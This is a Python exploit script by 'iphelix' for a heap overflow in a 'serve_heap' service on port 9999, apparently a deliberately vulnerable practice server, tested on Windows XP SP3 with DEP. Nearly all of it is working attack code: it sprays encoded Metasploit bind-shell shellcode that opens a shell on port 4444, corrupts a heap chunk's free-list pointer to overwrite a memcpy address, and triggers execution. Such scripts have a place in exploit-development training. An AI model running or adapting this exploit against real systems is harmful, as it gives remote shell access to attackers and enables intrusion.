#!/usr/bin/env python
#
# serve_heap heap overflow exploit
#    by iphelix 
# 
# Tested on Windows XP SP3 with DEP set to AlwaysOn

import sys, socket
from struct import pack
from binascii import hexlify

HOST = sys.argv[1]
PORT = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

target = pack("I",0x004061b0) # 0x004061b0 - memcpy
scaddr = pack("I",0x004926b0) # shellcode address

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, 
# EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=
# BADCHARS='\x00\x20'
shellcode = (
"\xba\x3b\xaf\x2d\xf2\xda\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x56\x31\x56\x13\x03\x56\x13\x83\xee\xc7\x4d\xd8\x0e\xdf\x1b"
"\x23\xef\x1f\x7c\xad\x0a\x2e\xae\xc9\x5f\x02\x7e\x99\x32\xae"
"\xf5\xcf\xa6\x25\x7b\xd8\xc9\x8e\x36\x3e\xe7\x0f\xf7\xfe\xab"
"\xd3\x99\x82\xb1\x07\x7a\xba\x79\x5a\x7b\xfb\x64\x94\x29\x54"
"\xe2\x06\xde\xd1\xb6\x9a\xdf\x35\xbd\xa2\xa7\x30\x02\x56\x12"
"\x3a\x53\xc6\x29\x74\x4b\x6d\x75\xa5\x6a\xa2\x65\x99\x25\xcf"
"\x5e\x69\xb4\x19\xaf\x92\x86\x65\x7c\xad\x26\x68\x7c\xe9\x81"
"\x92\x0b\x01\xf2\x2f\x0c\xd2\x88\xeb\x99\xc7\x2b\x78\x39\x2c"
"\xcd\xad\xdc\xa7\xc1\x1a\xaa\xe0\xc5\x9d\x7f\x9b\xf2\x16\x7e"
"\x4c\x73\x6c\xa5\x48\xdf\x37\xc4\xc9\x85\x96\xf9\x0a\x61\x47"
"\x5c\x40\x80\x9c\xe6\x0b\xcd\x51\xd5\xb3\x0d\xfd\x6e\xc7\x3f"
"\xa2\xc4\x4f\x0c\x2b\xc3\x88\x73\x06\xb3\x07\x8a\xa8\xc4\x0e"
"\x49\xfc\x94\x38\x78\x7c\x7f\xb9\x85\xa9\xd0\xe9\x29\x01\x91"
"\x59\x8a\xf1\x79\xb0\x05\x2e\x99\xbb\xcf\x59\x9d\x75\x2b\x0a"
"\x4a\x74\xcb\xbd\xd6\xf1\x2d\xd7\xf6\x57\xe5\x4f\x35\x8c\x3e"
"\xe8\x46\xe6\x12\xa1\xd0\xbe\x7c\x75\xde\x3e\xab\xd6\x73\x96"
"\x3c\xac\x9f\x23\x5c\xb3\xb5\x03\x17\x8c\x5e\xd9\x49\x5f\xfe"
"\xde\x43\x37\x63\x4c\x08\xc7\xea\x6d\x87\x90\xbb\x40\xde\x74"
"\x56\xfa\x48\x6a\xab\x9a\xb3\x2e\x70\x5f\x3d\xaf\xf5\xdb\x19"
"\xbf\xc3\xe4\x25\xeb\x9b\xb2\xf3\x45\x5a\x6d\xb2\x3f\x34\xc2"
"\x1c\xd7\xc1\x28\x9f\xa1\xcd\x64\x69\x4d\x7f\xd1\x2c\x72\xb0"
"\xb5\xb8\x0b\xac\x25\x46\xc6\x74\x55\x0d\x4a\xdc\xfe\xc8\x1f"
"\x5c\x63\xeb\xca\xa3\x9a\x68\xfe\x5b\x59\x70\x8b\x5e\x25\x36"
"\x60\x13\x36\xd3\x86\x80\x37\xf6"
)
shellcode = hexlify(shellcode) # encode shellcode

print "%s" % s.recv(1024)

# 0) Spray the shellcode
for i in range(20):
    payload = " deadbeef" + "20" + "90"*(2039 - len(shellcode)/2) + shellcode
    s.sendall("HTER " + payload)
    print "%s" % s.recv(1024)

# 1) Allocate chunk A
s.sendall("KSTET " + "A"*8 + "\x00")
print "%s" % s.recv(1024)

# 2) Allocate and free chunk B
s.sendall("GMON " + "A"*8 + "\x00")
print "%s" % s.recv(1024)

# 3) Overflow chunk A and overwrite chunk B's flink
s.sendall("GTER " + "A"*8 + "B"*8 + target)
print "%s" % s.recv(1024)

# 4) Allocate chunk B and chunk C. Overwrite the target.
s.sendall("STATS " + scaddr)
print "%s" % s.recv(1024)

# 5) Trigger the shellcode
s.sendall("HELP" + "\x00")

s.close()
